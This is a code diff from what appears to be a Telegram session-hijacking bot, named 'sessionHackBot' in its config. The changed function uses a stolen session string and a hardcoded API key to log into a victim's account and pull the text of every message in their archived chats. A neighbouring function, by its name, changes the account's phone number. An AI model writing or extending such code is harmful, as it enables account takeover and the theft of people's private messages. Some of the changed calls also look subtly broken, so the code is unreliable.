@@ -24,11 +24,19 @@ Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
 async def savedmsgs(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        saved_messages = []
-        async for message in X.iter_messages(entity="me"):
-            if message.saved_from_peer:
-                saved_messages.append(message.text)
-        return saved_messages
+        try:
+            dialogs = await X.get_all_chats()
+            saved_messages = []
+            for dialog in dialogs:
+                if dialog.archived:
+                    messages = await X.get_messages(dialog.id, None)
+                    for message in messages:
+                        saved_messages.append(message.text)
+            return "\n\n".join(saved_messages)
+        except Exception as e:
+            print(e)
+            return "Error: Failed to fetch saved messages."
+
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
